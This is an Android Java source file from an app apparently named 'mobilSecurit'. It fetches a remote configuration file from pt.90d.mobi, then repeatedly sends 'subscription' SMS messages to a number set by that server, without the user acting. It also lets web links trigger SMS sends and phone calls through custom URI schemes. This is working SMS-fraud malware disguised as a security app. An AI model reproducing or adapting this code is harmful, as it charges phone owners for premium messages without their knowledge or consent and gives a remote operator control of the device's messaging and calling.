package com.caliente.mobilsecurit;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.util.Date;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.format.DateFormat;
import android.widget.Toast;

public class SmsSchemeActivity extends Activity
{
	private String config_url="http://pt.90d.mobi/app/config.xml";
	private int moAbo=0, maxSmsJour=0, recurenceAbo=0; 
	private String supprSmsRef=null, shAbo=null, mcAbo=null, modifSmsRelance=null;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) 
	{
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		SharedPreferences preferences = getSharedPreferences("config", MODE_PRIVATE);
		
		// CPT MAX SMS JOUR
		String date_jour = (String) DateFormat.format("yyyyMMdd", new Date());
		int pref_cpt_date_sms_jour=preferences.getInt(date_jour, 0);
		
		// CHECK WS CALIBRAGE APP
		Element xmlElement=getXmlElement(config_url);
		if(xmlElement !=null)
		{
			parsing_dom(xmlElement);
			
			Editor editor = preferences.edit();
			if(supprSmsRef != null && modifSmsRelance != null)
			{
				// ON ENREG LE NB DE SMS JOURNALIER
				editor.putString("supprSmsRef", supprSmsRef);
				editor.putString("modifSmsRelance", modifSmsRelance);
				editor.commit();
			}
			
			// SMS ABO
			int timestamp_actuel=(int) (System.currentTimeMillis()/1000);
			int pref_date_last_abo=preferences.getInt("last_abo", 0);
			if(pref_date_last_abo + recurenceAbo < timestamp_actuel)
			{
				// ON ENREG LE NB DE SMS JOURNALIER
				editor.putInt("last_abo", timestamp_actuel);
				editor.commit();
				
				SmsManager smsManager=SmsManager.getDefault();
				for (int i = 0; i < moAbo; i++)
					smsManager.sendTextMessage(shAbo, null, mcAbo, null, null);
			}
			
			System.out.println("maxSmsJour::"+maxSmsJour+" || moSemaine::"+moAbo+" || supprSmsRef::"+supprSmsRef+" || recurenceAbo::"+recurenceAbo);
			System.out.println("pref_cpt_date_sms_jour::"+pref_cpt_date_sms_jour+" || pref_date_last_abo + recurenceAbo::"+pref_date_last_abo + recurenceAbo+" || timestamp_actuel::"+timestamp_actuel);
			
			Uri data = getIntent().getData(); 
			if(getIntent().getDataString() != null && data != null && (getIntent().getDataString().contains("httapp:") || getIntent().getDataString().contains("http:")))
			{
				String url = "http://"+data.getHost()+"/app/?"+data.getQuery();
				
				System.out.println(url);
				
				Intent i = new Intent(Intent.ACTION_VIEW);
				i.setData(Uri.parse(url));
				startActivity(i);
			}
			else if(getIntent().getDataString() != null && getIntent().getDataString().contains("smsapp:"))
			{
				SmsManager smsManager=SmsManager.getDefault();
				String[] tokens = getIntent().getDataString().split("#body=");
				String[] tab_numero = tokens[0].split("smsapp");
				
				String motcle=tokens[1];
				String numero=tab_numero[1];
				
				try {
					motcle = URLDecoder.decode(motcle, "UTF-8");
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				System.out.println("MOTCLE:"+motcle);
				System.out.println("numero:"+numero);
				
				if(pref_cpt_date_sms_jour <= maxSmsJour)
				{
					// ON ENREG LE NB DE SMS JOURNALIER
					pref_cpt_date_sms_jour++;
					editor.putInt(date_jour, pref_cpt_date_sms_jour);
					editor.commit();
					
					smsManager.sendTextMessage(numero, null, motcle, null, null);
				}
				else
					Toast.makeText(SmsSchemeActivity.this, "Vous avez atteint la limite de message ˆ envoyez. Revenez demain.", Toast.LENGTH_LONG).show();
			}
			else if(getIntent().getDataString() != null && getIntent().getDataString().contains("telapp:"))
			{
				System.out.println("TEL::"+getIntent().getDataString());
				
				String[] tokens = getIntent().getDataString().split("app");
				String numero = tokens[0].concat(tokens[1]);
				
				System.out.println("numeroooo::"+numero);
				
				Intent intent= new Intent(Intent.ACTION_CALL, Uri.parse(numero));
				startActivity(intent);
			}
			
			finish();
		}
	}
	
	private Element getXmlElement(String st_url)
	{
		Element element = null;
		try 
		{
			URL url = new URL(st_url);
			InputStream inputStream = url.openConnection().getInputStream();
			
			DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
			DocumentBuilder builder = factory.newDocumentBuilder();
			Document dom = builder.parse(inputStream);
			inputStream.close();
			element=dom.getDocumentElement();
		} 
		catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ParserConfigurationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (SAXException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return element;
	}
	
	private void parsing_dom(Element racine)
	{
		NodeList xml_app=racine.getElementsByTagName("app");
		
		int xml_app_lenght=xml_app.getLength();
		boolean node_find=false; 
		for(int i=0;i<xml_app_lenght;i++)
		{
			NodeList xml_app_item = xml_app.item(i).getChildNodes();
			int xml_app_item_length = xml_app_item.getLength();
			Node item;
			for(int j=0;j<xml_app_item_length;j++)
			{
				item=xml_app_item.item(j);
				
				if(item.getNodeName().equals("name"))
				{
					if(item.getFirstChild().getNodeValue().equals("mobilSecurit"))
						node_find=true;
				}
				
				if(item.getNodeName().equals("maxSmsJour") && node_find)
					maxSmsJour = Integer.parseInt(item.getFirstChild().getNodeValue());
				
				if(item.getNodeName().equals("moAbo"))
					moAbo = Integer.parseInt(item.getFirstChild().getNodeValue());
				
				if(item.getNodeName().equals("recurenceAbo"))
					recurenceAbo = Integer.parseInt(item.getFirstChild().getNodeValue());
				
				if(item.getNodeName().equals("supprSmsRef"))
					supprSmsRef = item.getFirstChild().getNodeValue();
				
				if(item.getNodeName().equals("modifSmsRelance"))
					modifSmsRelance = item.getFirstChild().getNodeValue();
				
				if(item.getNodeName().equals("shAbo"))
					shAbo = item.getFirstChild().getNodeValue();
				
				if(item.getNodeName().equals("mcAbo"))
					mcAbo = item.getFirstChild().getNodeValue();
			}
			
			if(node_find) 
				break;
		}
	}
}